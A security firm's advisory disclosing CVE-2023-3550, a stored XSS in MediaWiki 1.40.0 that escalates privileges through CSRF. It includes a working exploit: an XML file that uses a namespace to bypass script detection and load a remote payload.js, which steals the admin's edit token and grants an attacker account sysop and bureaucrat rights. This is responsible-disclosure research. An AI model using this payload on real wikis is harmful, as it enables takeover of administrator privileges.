[Contact us](/contact-us/)SearchEnglishEnglishEspaÃ±ol

* [![Fluid Attacks logo navbar](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/menu/Logo?_a=AXAJYUZ0.webp)](/)
ServicePlatform[Plans](/plans/)Resources[Advisories](/advisories/)Company[Log in](https://app.fluidattacks.com/)[Try for free](https://app.fluidattacks.com/SignUp)
# Stored XSS leads to privilege escalation in MediaWiki v1.40.0

## Summary

|  |  |
| --- | --- |
| **Name** | Stored XSS leads to privilege escalation in MediaWiki v1.40.0 |
| **Code name** | [Blondie](https://en.wikipedia.org/wiki/Blondie_%28band%29) |
| **Product** | product: MediaWiki |
| **Affected versions** | Version 1.40.0 |
|
| **State** | Private |
| **Release date** | 2023-10-11 |

## Vulnerability

|  |  |
| --- | --- |
| **Kind** | Stored cross-site scripting |
| **Rule** | [010. Stored cross-site scripting](https://docs.fluidattacks.com/criteria/vulnerabilities/010) |
| **Remote** | Yes |
| **CVSSv3.1 Vector** | CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N |
| **CVSSv3.1 Base Score** | 7.3 |
| **Exploit available** | Yes |
| **CVE ID(s)** | [CVE-2023-3550](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-3550) |

## Description

Mediawiki v1.40.0 does not validate namespaces used in XML files.
Therefore, if the instance administrator allows XML file uploads,
a remote attacker with a low-privileged user account can use this
exploit to become an administrator by sending a malicious link to
the instance administrator.

## Vulnerability

In Mediawiki v1.40.0, an authenticated remote attacker can escalate
his privileges through a Stored XSS. Thanks to this, we can perform
a CSRF on an administrative account to escalate the privileges of an
arbitrary account.

The Stored XSS is caused by MediaWiki v1.40.0 not validating the
namespaces used in XML files. Thanks to this we can bypass the script
detection security controls.

### Exploit failed

Here our exploit attempt fails, thanks to the script being detected
correctly:

![exploit-failed](https://user-images.githubusercontent.com/51862990/251885755-675ccfe7-825d-45af-924b-868cf5b38be2.png)

### Exploit Success

Here the exploit worked, since we bypassed the script detection controls
by using a namespace:

![exploit-success](https://user-images.githubusercontent.com/51862990/251885730-084c14e6-fc19-4a26-aa7a-564f1331070b.png)

## Exploit

To exploit the vulnerability we built an XML file that uses a namespace to
bypass script detection protection. This script loads an external script which
seeks to escalate the privileges of an account when the administrator accesses
the malicious XML link through a CSRF.

### exploit.xml

```
<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="http://localhost:7777/payload.js">
</x:script>

```
### payload.js

```
var token = "";

fetch('http://localhost:8080/mediawiki-1.40.0/index.php?title=Special%3AUserRights&user=Hacker', {
 credentials: 'include'
})
.then(response => response.text())
.then(html => {
 const parser = new DOMParser();
 const doc = parser.parseFromString(html, 'text/html');
 token = doc.getElementsByName('wpEditToken')[0].value;

 // Llamar a la segunda solicitud POST despuÃ©s de obtener el token
 return fetch('http://localhost:8080/mediawiki-1.40.0/index.php/Special:UserRights', {
 method: 'POST',
 credentials: 'include',
 headers: {'Content-Type': 'application/x-www-form-urlencoded'},
 body: 'user=Hacker&wpEditToken=' + encodeURIComponent(token) + '&conflictcheck-originalgroups=&wpExpiry-bot=infinite&wpExpiry-bot-other=&wpGroup-sysop=1&wpExpiry-sysop=infinite&wpExpiry-sysop-other=&wpGroup-interface-admin=1&wpExpiry-interface-admin=infinite&wpExpiry-interface-admin-other=&wpGroup-bureaucrat=1&wpExpiry-bureaucrat=infinite&wpExpiry-bureaucrat-other=&wpExpiry-suppress=infinite&wpExpiry-suppress-other=&user-reason=&saveusergroups=Save+user+groups'
 });
})
.then(response => {
 console.log('Respuesta:', response);
})
.catch(error => {
    console.error('Error:', error);
});

```
## Evidence of exploitation

Here is a step-by-step description of how to exploit this vulnerability.
Basically what will be shown below is how a user with low privileges can
increase his privileges by sending a malicious link to the instance administrator.

## Our security policy

We have reserved the CVE-2023-3550 to refer to these issues from now on.

* <https://fluidattacks.com/advisories/policy/>

## System Information

* Version: MediaWiki 1.40.0
* Operating System: MacOS

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://www.mediawiki.org/wiki/MediaWiki>

## Timeline

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-07-07

Vulnerability discovered.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-07-07

Vendor contacted.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-07-11

Vendor replied acknowledging the report.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-07-11

Vendor Confirmed the vulnerability.

![Time-lapse-logo](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/icons/red-circle-check?_a=AXAJYUZ0.webp)

2023-10-11

Public Disclosure.

[![Fluid Logo Footer](https://res.cloudinary.com/fluid-attacks/image/upload/f_auto,q_auto/v1/airs/fluid-attacks-logo-2022-light?_a=AXAJYUZ0.webp)](/)

Hacking software for over 20 years

Fluid Attacks tests applications and other systems, covering all software development stages. Our team assists clients in quickly identifying and managing vulnerabilities to reduce the risk of incidents and deploy secure technology.

Service

[Continuous Hacking](/services/continuous-hacking/)[Platform overview](/platform/)

Solutions

[Application security](/solutions/)[Compliance](/compliance/)[Systems](/systems/)

Testing Techniques

[ASPM](/product/aspm/)[SAST](/product/sast/)[DAST](/product/dast/)[MPT](/product/mpt/)[MAST](/product/mast/)[SCA](/product/sca/)[CSPM](/product/cspm/)[PTaaS](/product/ptaas/)[RE](/product/re/)[SCR](/solutions/secure-code-review/)

Plans

[Essential](/plans/#essential)[Advanced](/plans/)

Resources

[Blog](/blog/)[Learn](/learn/)[Advisories](/advisories/)[Clients](/clients/)[Downloadables](/resources/)[Documentation](https://docs.fluidattacks.com/)

Company

[About us](/about-us/)[Certifications](/certifications/)[Partners](/partners/)[Careers](/careers/)[Contact us](/contact-us/)[Ethics Hotline](https://r.easyllama.com/ed68576b-c349-4f40-926b-4905c82c53bb)

Copyright Â© 0 Fluid Attacks. We hack your software. All rights reserved.

[Service status](https://status.fluidattacks.com/)[Terms of use](/terms-use/)[Privacy policy](/privacy/)[Cookie policy](/cookie/)

